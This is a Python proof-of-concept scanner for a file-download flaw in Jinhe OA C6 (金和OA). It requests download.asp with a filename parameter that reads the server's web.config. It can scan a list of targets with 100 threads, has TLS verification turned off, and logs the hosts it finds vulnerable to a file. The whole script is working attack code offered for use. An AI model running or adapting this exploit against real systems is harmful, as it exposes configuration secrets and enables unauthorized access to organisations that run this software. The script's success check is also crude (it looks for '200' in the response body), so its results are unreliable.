# -*- coding: utf-8 -*-
import argparse
import sys
import requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """   
 
      ,--.-, .=-.-..-._        ,--.-,,-,--,    ,----.            _,.---._     ,---.       _,.----.       .,-.  
     |==' -|/==/_ /==/ \  .-._/==/  /|=|  | ,-.--` , \         ,-.' , -  `. .--.'  \    .' .' -   \     / \==\ 
     |==|- |==|, ||==|, \/ /, /==|_ ||=|, ||==|-  _.-`        /==/_,  ,  - \\==\-/\ \  /==/  ,  ,-'    / -/==/ 
   __|==|, |==|  ||==|-  \|  ||==| ,|/=| _||==|   `.-.       |==|   .=.     /==/-|_\ | |==|-   |  .   /- /==/  
,--.-'\=|- |==|- ||==| ,  | -||==|- `-' _ /==/_ ,    /       |==|_ : ;=:  - \==\,   - \|==|_   `-' \ /  /==/   
|==|- |=/ ,|==| ,||==| -   _ ||==|  _     |==|    .-'        |==| , '='     /==/ -   ,||==|   _  , |/. / \==\  
|==|. /=| -|==|- ||==|  /\ , ||==|   .-. ,\==|_  ,`-._        \==\ -    ,_ /==/-  /\ - \==\.       / _ \_/\==\ 
\==\, `-' //==/. //==/, | |- |/==/, //=/  /==/ ,     /         '.='. -   .'\==\ _.\=\.-'`-.`.___.-'\ . -  /==/ 
 `--`----' `--`-` `--`./  `--``--`-' `-`--`--`-----``            `--`--''   `--`                    '----`--`  

                                                                              tag:  金和OA C6 download.jsp
                                                                              @version: 1.0.0   @author: haha                            
    """
    print(test)


def poc(target):
    url = target+"/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",

    }

    try:
        res = requests.get(url, headers=headers, verify=False, timeout=5).text
        if "200" in res:
            print(f"[+] 经检查,{target} is vulable")
            with open("vulable.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
            return True
        else:
            print(f"[+] 经检查,{target} is not vulable")
            return False

    except :
        print(f"[*] {target} server error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()